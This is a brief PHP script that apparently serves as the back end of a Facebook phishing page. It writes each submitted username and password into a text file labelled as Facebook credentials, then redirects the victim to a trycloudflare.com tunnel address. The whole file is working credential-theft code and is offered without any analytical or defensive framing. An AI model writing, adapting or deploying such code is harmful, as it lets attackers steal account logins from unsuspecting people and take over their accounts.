<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://october-lean-editorials-fabrics.trycloudflare.com');
exit();
?>